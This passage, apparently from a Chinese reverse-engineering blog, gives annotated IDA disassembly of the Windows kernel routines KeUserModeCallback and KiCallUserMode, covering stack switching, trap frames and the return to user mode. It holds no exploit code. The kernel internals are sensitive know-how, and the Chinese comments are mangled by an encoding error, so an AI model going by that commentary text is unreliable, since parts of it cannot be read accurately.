CODE XREF: KeUserModeCallback(x,x,x,x,x)+184â†‘j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC11                 mov     eax, [esi+_KTHREAD.Teb]</span><br><span class="line">PAGE:<span class="number">007</span>EDC17                 mov     eax, [eax+_TEB.GdiBatchCount]</span><br><span class="line">PAGE:<span class="number">007</span>EDC1D                 mov     [ebp+var_TEBGdiBatchCount], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDC1D <span class="comment">//   &#125; // starts at 7EDBF7</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC20                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br><span class="line">PAGE:<span class="number">007</span>EDC27                 mov     ecx, [ebp+var_TrapFrame]</span><br><span class="line">PAGE:<span class="number">007</span>EDC2A</span><br><span class="line">PAGE:<span class="number">007</span>EDC2A loc_7EDC2A:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+109281â†“j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC2A                 test    eax, eax</span><br><span class="line">PAGE:<span class="number">007</span>EDC2C                 jnz     <span class="keyword">short</span> loc_7EDC64 <span class="comment">// TEB.GdiBatchCount != 0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC2E</span><br><span class="line">PAGE:<span class="number">007</span>EDC2E loc_7EDC2E:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+1F8â†“j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC2E                 cmp     edi, <span class="number">0</span>C0000423h <span class="comment">// STATUS_CALLBACK_POP_STACK(A user mode unwind is in progress.)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC34                 jz      <span class="keyword">short</span> loc_7EDC3F</span><br><span class="line">PAGE:<span class="number">007</span>EDC36                 mov     eax, [ebp+var_TrapFrame]</span><br><span class="line">PAGE:<span class="number">007</span>EDC39                 mov     ecx, [ebp+var_HardwareEsp]</span><br><span class="line">PAGE:<span class="number">007</span>EDC3C                 mov     [eax+_KTRAP_FRAME.HardwareEsp], ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDC3F</span><br><span class="line">PAGE:<span class="number">007</span>EDC3F loc_7EDC3F:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+1B4â†‘j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC3F                                         <span class="comment">// KeUserModeCallback(x,x,x,x,x)+1092A9â†“j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC3F                 dec     [esi+_KTHREAD.___u55.__s6.CallbackNestingLevel]</span><br><span class="line">PAGE:<span class="number">007</span>EDC45                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">PAGE:<span class="number">007</span>EDC47                 mov     ecx, ebx</span><br><span class="line">PAGE:<span class="number">007</span>EDC49                 call    _MmDeleteKernelStack@<span class="number">8</span> <span class="comment">// MmDeleteKernelStack(x,x)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC4E                 mov     eax, edi</span><br><span class="line">PAGE:<span class="number">007</span>EDC50</span><br><span class="line">PAGE:<span class="number">007</span>EDC50 loc_7EDC50:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+10923Fâ†“j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC50                                         <span class="comment">// KeUserModeCallback(x,x,x,x,x)+10924Fâ†“j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC50                 mov     ecx, [ebp+ms_exc.registration.Next]</span><br><span class="line">PAGE:<span class="number">007</span>EDC53                 mov     large fs:<span class="number">0</span>, ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDC5A                 pop     ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDC5B                 pop     edi</span><br><span class="line">PAGE:<span class="number">007</span>EDC5C                 pop     esi</span><br><span class="line">PAGE:<span class="number">007</span>EDC5D                 pop     ebx</span><br><span class="line">PAGE:<span class="number">007</span>EDC5E                 mov     esp, ebp</span><br><span class="line">PAGE:<span class="number">007</span>EDC60                 pop     ebp</span><br><span class="line">PAGE:<span class="number">007</span>EDC61                 retn    <span class="number">14</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDC64 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC64</span><br><span class="line">PAGE:<span class="number">007</span>EDC64 loc_7EDC64:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+1ACâ†‘j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC64                 add     dword ptr [ecx+<span class="number">74</span>h], <span class="number">0F</span>FFFFF00h <span class="comment">// TEB.GdiBatchCount != 0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC6B                 push    <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC6D                 push    <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC6F                 push    <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC71                 push    <span class="number">7</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC73                 call    _PsInvokeWin32Callout@<span class="number">16</span> <span class="comment">// PsInvokeWin32Callout(x,x,x,x)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC78                 jmp     <span class="keyword">short</span> loc_7EDC2E <span class="comment">// STATUS_CALLBACK_POP_STACK(A user mode unwind is in progress.)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC78 <span class="comment">// &#125; // starts at 7EDA80</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC78 _KeUserModeCallback@<span class="number">20</span> endp</span><br></pre></td></tr></table></figure>





<p><img data-src="https://s2.loli.net/2022/10/17/CzKN4hkqQXYuDtM.png" alt="33.png"></p>
<h3 id="4-3-KiCallUserModeå‡½æ•°åˆ†æ"><a href="#4-3-KiCallUserModeå‡½æ•°åˆ†æ" class="headerlink" title="4.3 KiCallUserModeå‡½æ•°åˆ†æ"></a>4.3 KiCallUserModeå‡½æ•°åˆ†æ</h3><p>å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KiCallUserMode</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                    IN PVOID   *OutputBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">                    IN PULONG  OutputLength,</span></span></span><br><span class="line"><span class="function"><span class="params">                    IN PVOID   pPreviousThreadStackInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">                    IN PVOID   pNewStackBaseAddress </span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>pPreviousThreadStackInfoï¼šä¸ºå‡½æ•° <code>MmCreateKernelStack</code> è¿”å›åœ°å€ <code>-0x20</code>ï¼Œå³æŒ‡å‘ <code>KSTACK_CONTROL</code> ç»“æ„ã€‚</li>
<li>pNewStackBaseAddressï¼šä¸ºå‡½æ•° <code>MmCreateKernelStack</code> è¿”å›åœ°å€ã€‚</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/10/18/QjIRO51cnSL62Ai.png" alt="34.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0057</span>D764</span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">// NTSTATUS KiCallUserMode (</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">//                     IN PVOID   *OutputBuffer,</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">//                     IN PULONG  OutputLength,</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">//                     IN PVOID   pPreviousThreadStackInfo,</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">//                     IN PVOID   pNewStackBaseAddress</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">// )</span></span><br><span class="line">.text:<span class="number">0057</span>D764</span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">// __stdcall KiCallUserMode(x, x, x, x)</span></span><br><span class="line">.text:<span class="number">0057</span>D764 _KiCallUserMode@<span class="number">16</span> proc near            <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+16Dâ†“p</span></span><br><span class="line">.text:<span class="number">0057</span>D764                                         <span class="comment">// DATA XREF: .data:006ACAC0â†“o</span></span><br><span class="line">.text:<span class="number">0057</span>D764</span><br><span class="line">.text:<span class="number">0057</span>D764 arg_pPreviousThreadStackInfo= dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0057</span>D764 arg_pNewStackBaseAddress= dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0057</span>D764</span><br><span class="line">.text:<span class="number">0057</span>D764                 push    ebp</span><br><span class="line">.text:<span class="number">0057</span>D765                 push    ebx</span><br><span class="line">.text:<span class="number">0057</span>D766                 push    esi</span><br><span class="line">.text:<span class="number">0057</span>D767                 push    edi</span><br><span class="line">.text:<span class="number">0057</span>D768                 cld</span><br><span class="line">.text:<span class="number">0057</span>D769                 mov     ebx, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">.text:<span class="number">0057</span>D770                 mov     ecx, [esp+<span class="number">10</span>h+arg_pPreviousThreadStackInfo]</span><br><span class="line">.text:<span class="number">0057</span>D774                 mov     [ecx+<span class="number">18</span>h], esp  <span class="comment">// ecxæŒ‡å‘KSTACK_CONTROLç»“æ„</span></span><br><span class="line">.text:<span class="number">0057</span>D777                 mov     ebp, large fs:_KPCR</span><br><span class="line">.text:<span class="number">0057</span>D77E                 mov     [ecx+<span class="number">0</span>Ch], ebp</span><br><span class="line">.text:<span class="number">0057</span>D781                 mov     eax, [ebx+_KTHREAD.TrapFrame] <span class="comment">// eax = OldTrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D781                                         <span class="comment">// OldTrapFrameä¸­çš„esp3å·²ç»åœ¨ä¸Šä¸€ä¸ªå‡½æ•°ä¿®æ”¹</span></span><br><span class="line">.text:<span class="number">0057</span>D784                 mov     [ecx+<span class="number">8</span>], eax</span><br><span class="line">.text:<span class="number">0057</span>D787                 mov     edx, [esp+<span class="number">10</span>h+arg_pNewStackBaseAddress]</span><br><span class="line">.text:<span class="number">0057</span>D78B                 mov     esi, edx</span><br><span class="line">.text:<span class="number">0057</span>D78D                 sub     esi, ds:_KeKernelStackSize <span class="comment">// è°ƒæ•´ OutputLength å¤§å°</span></span><br><span class="line">.text:<span class="number">0057</span>D793                 xorps   xmm0, xmm0</span><br><span class="line">.text:<span class="number">0057</span>D796                 xorps   xmm1, xmm1</span><br><span class="line">.text:<span class="number">0057</span>D799                 xorps   xmm2, xmm2</span><br><span class="line">.text:<span class="number">0057</span>D79C                 xorps   xmm3, xmm3</span><br><span class="line">.text:<span class="number">0057</span>D79F                 xorps   xmm4, xmm4</span><br><span class="line">.text:<span class="number">0057</span>D7A2                 xorps   xmm5, xmm5</span><br><span class="line">.text:<span class="number">0057</span>D7A5                 xorps   xmm6, xmm6</span><br><span class="line">.text:<span class="number">0057</span>D7A8                 xorps   xmm7, xmm7</span><br><span class="line">.text:<span class="number">0057</span>D7AB                 cli                     <span class="comment">// å…³é—­ä¸­æ–­</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                 mov     [ebx+_KTHREAD.InitialStack], ecx <span class="comment">// ==============================</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// è¿›è¡Œå †æ ˆåˆ‡æ¢</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// PVOID InitialStack//// è®°å½•äº†åŸå§‹çš„æ ˆä½ç½®(é«˜åœ°å€)</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// PVOID StackLimit//  // è®°å½•äº†æ ˆçš„ä½åœ°å€</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// PVOID KernelStack// // è®°å½•äº†çœŸæ­£å†…æ ¸è°ƒç”¨æ ˆçš„å¼€å§‹ä½ç½®</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// ================================================</span></span><br><span class="line">.text:<span class="number">0057</span>D7AF                 mov     [ebx+_KTHREAD.StackBase], edx</span><br><span class="line">.text:<span class="number">0057</span>D7B2                 mov     [ebx+_KTHREAD.StackLimit], esi</span><br><span class="line">.text:<span class="number">0057</span>D7B5                 sub     ecx, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0057</span>D7B8                 test    ss:_KiKvaShadow, <span class="number">1</span> <span class="comment">// ===============================================</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// å†…æ ¸è™šæ‹Ÿåœ°å€å½±å­ï¼ˆKernel Virtual Address Shadowï¼Œç”±å¾®è½¯æå‡ºçš„ä¸€ä¸ªæœ¯è¯­ï¼Œç®€ç§°KVASï¼‰</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// å¾®è½¯å¼•å…¥çš„ç¼“è§£æœºåˆ¶</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// è¯¥ç‰¹æ€§ä»…å…è®¸ç”¨æˆ·æ¨¡å¼ä»£ç è®¿é—®æœ‰é™çš„å†…æ ¸å†…å­˜ï¼Œä¸»è¦ç”¨æ¥æœ‰æ•ˆé˜²èŒƒMeltdownæ”»å‡»</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// ç³»ç»Ÿåˆå§‹åŒ–æ—¶ KiSystemStartupï¼ŒKiEnableKvaShadowingçš„åŠŸèƒ½æ˜¯è´Ÿè´£å¯ç”¨KVASï¼Œå¹¶è®¾ç½®KiKvaShadow = 1ã€‚</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// å¦‚æœå¯¹KiKvaShadowçš„æ£€æŸ¥ç»“æœä¸ºTRUEï¼Œå°±ä¸ä¼šä½¿ç”¨æ­£å¸¸çš„ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åºï¼ˆKiSystemCall32å’ŒKiSystemCall64ï¼‰ï¼Œ</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// è€Œæ˜¯ä½¿ç”¨Shadowç‰ˆæœ¬ã€‚å¦‚æœè¯¥å¤„ç†å™¨æ˜¯AMDçš„ï¼Œåˆ™ä¼šä½¿ç”¨AMDä¸“ç”¨ç‰ˆæœ¬ã€‚</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// KiKvaShadow = 1ï¼Œå¹¶éšåé…ç½®ç³»ç»Ÿè°ƒç”¨å¤„ç†å™¨ä¸ºKiSystemCall32Shadow/KiSystemCall64Shadow</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// è€Œè‹¥æ²¡æœ‰å¼€å¯KVASåˆ™å‘ç”Ÿç³»ç»Ÿè°ƒç”¨æ—¶è°ƒç”¨çš„å¤„ç†å™¨æ˜¯KiSystemCall32/KiSystemCall64ã€‚</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// ===============================================</span></span><br><span class="line">.text:<span class="number">0057</span>D7C0                 mov     large fs:_KPCR.PrcbData.EspBaseShadow, ecx</span><br><span class="line">.text:<span class="number">0057</span>D7C7                 jnz     <span class="keyword">short</span> loc_57D7D3</span><br><span class="line">.text:<span class="number">0057</span>D7C9                 mov     edi, large fs:_KPCR.___u0.__s1.TssCopy</span><br><span class="line">.text:<span class="number">0057</span>D7D0                 mov     [edi+_TSS.ESP0], ecx <span class="comment">// ecx == OutputBuffer - 0x10 çš„ä½ç½®ç”¨æ¥å­˜æ”¾ esp0.</span></span><br><span class="line">.text:<span class="number">0057</span>D7D0                                         <span class="comment">// æ–¹ä¾¿ä» 3 ç¯è¿”å›æ—¶ä½¿ç”¨</span></span><br><span class="line">.text:<span class="number">0057</span>D7D3</span><br><span class="line">.text:<span class="number">0057</span>D7D3 loc_57D7D3:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+63â†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>D7D3                 lea     edi, [ecx<span class="number">-7</span>Ch]</span><br><span class="line">.text:<span class="number">0057</span>D7D6                 mov     [ebx+_KTHREAD.TrapFrame], edi <span class="comment">// æ›´æ–° TrapFrame ä½ç½®ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span></span><br><span class="line">.text:<span class="number">0057</span>D7D9                 mov     esi, eax        <span class="comment">// eax = OldTrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7DB                 mov     ecx, <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">0057</span>D7E0                 rep movsd               <span class="comment">// å°†åŸå…ˆçš„TrapFrameå¤‡ä»½èµ·æ¥åˆ°OutputBuffer</span></span><br><span class="line">.text:<span class="number">0057</span>D7E2                 test    byte ptr [ebx+_KTHREAD.___u28.ApcState.___u4], <span class="number">3</span> <span class="comment">// SpecialUserApcPending,UserApcPending</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                 jnz     loc_57D875      <span class="comment">// å†ä¸€æ¬¡æ›´æ–°EBP0ï¼Œæ­¤æ—¶çš„EBP0æŒ‡å‘è¾“å‡ºç¼“å†²åŒºä¸­çš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">// ediæŒ‡å‘Outputbufferç¼“å†²åŒºçš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">// æœ‰ç”¨æˆ· APCï¼Œè°ƒè¯•çŠ¶æ€çš„æ—¶å€™ï¼Œä»è¿™é‡Œå»æ‰§è¡Œç”¨æˆ·å›è°ƒ</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">// è®¾ç½® Eip3 = KeUserCallbackDispatcher</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">// è°ƒç”¨ KiServiceExit</span></span><br><span class="line">.text:<span class="number">0057</span>D7EF                 test    dword ptr [ebx], <span class="number">0</span>DF800000h</span><br><span class="line">.text:<span class="number">0057</span>D7F5                 jnz     <span class="keyword">short</span> loc_57D875 <span class="comment">// å†ä¸€æ¬¡æ›´æ–°EBP0ï¼Œæ­¤æ—¶çš„EBP0æŒ‡å‘è¾“å‡ºç¼“å†²åŒºä¸­çš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">// ediæŒ‡å‘Outputbufferç¼“å†²åŒºçš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">// æœ‰ç”¨æˆ· APCï¼Œè°ƒè¯•çŠ¶æ€çš„æ—¶å€™ï¼Œä»è¿™é‡Œå»æ‰§è¡Œç”¨æˆ·å›è°ƒ</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">// è®¾ç½® Eip3 = KeUserCallbackDispatcher</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">// è°ƒç”¨ KiServiceExit</span></span><br><span class="line">.text:<span class="number">0057</span>D7F7                 test    [eax+_KTRAP_FRAME.EFlags], <span class="number">20100</span>h <span class="comment">// =======</span></span><br><span class="line">.text:<span class="number">0057</span>D7F7                                         <span class="comment">// TFï¼šé™·é˜±ï¼Œå¼€å¯å•æ­¥è°ƒè¯•</span></span><br><span class="line">.text:<span class="number">0057</span>D7F7                                         <span class="comment">// VMï¼šv86</span></span><br><span class="line">.text:<span class="number">0057</span>D7F7                                         <span class="comment">// =======</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                 jnz     <span class="keyword">short</span> loc_57D875 <span class="comment">// å†ä¸€æ¬¡æ›´æ–°EBP0ï¼Œæ­¤æ—¶çš„EBP0æŒ‡å‘è¾“å‡ºç¼“å†²åŒºä¸­çš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">// ediæŒ‡å‘Outputbufferç¼“å†²åŒºçš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">// æœ‰ç”¨æˆ· APCï¼Œè°ƒè¯•çŠ¶æ€çš„æ—¶å€™ï¼Œä»è¿™é‡Œå»æ‰§è¡Œç”¨æˆ·å›è°ƒ</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">// è®¾ç½® Eip3 = KeUserCallbackDispatcher</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">// è°ƒç”¨ KiServiceExit</span></span><br><span class="line">.text:<span class="number">0057</span>D800                 mov     edx, [eax+_KTRAP_FRAME.ExceptionList]</span><br><span class="line">.text:<span class="number">0057</span>D803                 mov     large fs:_KPCR, edx</span><br><span class="line">.text:<span class="number">0057</span>D80A                 mov     ebp, eax        <span class="comment">// é‡è¦ï¼šæ›´æ–° ebp0!!!!!!!!!</span></span><br><span class="line">.text:<span class="number">0057</span>D80C                 movzx   eax, large byte ptr fs:_KPCR.PrcbData.BpbUserSpecCtrl</span><br><span class="line">.text:<span class="number">0057</span>D814                 cmp     large fs:_KPCR.PrcbData.BpbCurrentSpecCtrl, al</span><br><span class="line">.text:<span class="number">0057</span>D81B                 jz      <span class="keyword">short</span> loc_57D82C <span class="comment">// BpbIbpbOnReturn</span></span><br><span class="line">.text:<span class="number">0057</span>D81D                 mov     large fs:_KPCR.PrcbData.BpbCurrentSpecCtrl, al</span><br><span class="line">.text:<span class="number">0057</span>D823                 mov     ecx, <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">0057</span>D828                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0057</span>D82A                 wrmsr                   <span class="comment">// Wrmsrå‘½ä»¤å°†ä¸€ä¸ªå€¼å†™å…¥ Model-Specific å°† (MSR) æ³¨å†Œåˆ°æŒ‡å®šåœ°å€ã€‚</span></span><br><span class="line">.text:<span class="number">0057</span>D82C</span><br><span class="line">.text:<span class="number">0057</span>D82C loc_57D82C:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+B7â†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>D82C                 btr     large word ptr fs:_KPCR.PrcbData.___u111, <span class="number">2</span> <span class="comment">// BpbIbpbOnReturn</span></span><br><span class="line">.text:<span class="number">0057</span>D836                 jnb     <span class="keyword">short</span> loc_57D846 <span class="comment">// MXCSRå¯„å­˜å™¨ï¼Œæ¶‰åŠæµ®ç‚¹è¿ç®—</span></span><br><span class="line">.text:<span class="number">0057</span>D838                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0057</span>D83D                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0057</span>D83F                 mov     ecx, <span class="number">49</span>h</span><br><span class="line">.text:<span class="number">0057</span>D844                 wrmsr</span><br><span class="line">.text:<span class="number">0057</span>D846</span><br><span class="line">.text:<span class="number">0057</span>D846 loc_57D846:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+D2â†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>D846                 ldmxcsr [ebp+_KTRAP_FRAME._MxCsr] <span class="comment">// MXCSRå¯„å­˜å™¨ï¼Œæ¶‰åŠæµ®ç‚¹è¿ç®—</span></span><br><span class="line">.text:<span class="number">0057</span>D84A                 mov     edx, ds:_KeUserCallbackDispatcher</span><br><span class="line">.text:<span class="number">0057</span>D850                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">0057</span>D852                 mov     ecx, [ebp+_KTRAP_FRAME.HardwareEsp]</span><br><span class="line">.text:<span class="number">0057</span>D855                 mov     ebp, [ebp+_KTRAP_FRAME._Ebp]</span><br><span class="line">.text:<span class="number">0057</span>D858                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0057</span>D85A                 <span class="keyword">xor</span>     esi, esi</span><br><span class="line">.text:<span class="number">0057</span>D85C                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0057</span>D864                 jnz     _KiKernelSysretExit</span><br><span class="line">.text:<span class="number">0057</span>D86A                 mov     edi, <span class="number">3B</span>h</span><br><span class="line">.text:<span class="number">0057</span>D86F                 mov     fs, di          <span class="comment">// ä½16 bits</span></span><br><span class="line">.text:<span class="number">0057</span>D872                 assume fs:nothing</span><br><span class="line">.text:<span class="number">0057</span>D872                 sti</span><br><span class="line">.text:<span class="number">0057</span>D873                 sysexit</span><br><span class="line">.text:<span class="number">0057</span>D875</span><br><span class="line">.text:<span class="number">0057</span>D875 loc_57D875:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+85â†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// KiCallUserMode(x,x,x,x)+91â†‘j ...</span></span><br><span class="line">.text:<span class="number">0057</span>D875                 lea     ebp, [edi<span class="number">-8</span>Ch]  <span class="comment">// å†ä¸€æ¬¡æ›´æ–°EBP0ï¼Œæ­¤æ—¶çš„EBP0æŒ‡å‘è¾“å‡ºç¼“å†²åŒºä¸­çš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// ediæŒ‡å‘Outputbufferç¼“å†²åŒºçš„TrapFrame</span></span><br><span class="line">.text:<span 